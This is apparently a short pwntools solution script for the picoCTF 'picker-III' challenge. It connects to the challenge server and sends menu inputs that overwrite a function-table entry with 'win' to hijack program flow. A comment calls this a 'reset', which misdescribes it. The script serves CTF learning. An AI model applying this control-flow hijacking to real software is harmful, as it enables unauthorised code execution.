from pwn import *

# Start the vulnerable program
#conn = process(['python3', 'picker-III.py'])

conn = remote('saturn.picoctf.net', 64395)
# Reset the function table to ensure clean state
conn.sendline('3'.encode())
conn.sendline('print_table'.encode())
conn.sendline('win'.encode())  # Fixed line
conn.sendline('1'.encode())

# Switch to interactive mode to observe the output
conn.interactive()
